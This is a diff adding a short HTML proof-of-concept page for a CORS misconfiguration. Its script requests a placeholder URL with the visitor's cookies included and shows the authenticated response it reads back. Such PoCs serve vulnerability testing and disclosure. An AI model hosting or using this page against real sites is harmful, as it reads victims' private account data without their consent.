@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Vulnerability PoC</title>
+</head>
+<body>
+    <h1>CORS Misconfiguration PoC</h1>
+    <div id="result">Loading...</div>
+
+    <script>
+        fetch('https://url.com', {
+            credentials: 'include' // Send cookies if user is authenticated
+        })
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('result').innerHTML = 
+                '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
+        })
+        .catch(error => {
+            document.getElementById('result').innerHTML = 
+                '<p>Error: ' + error + '</p>';
+        });
+    </script>
+</body>
+</html>
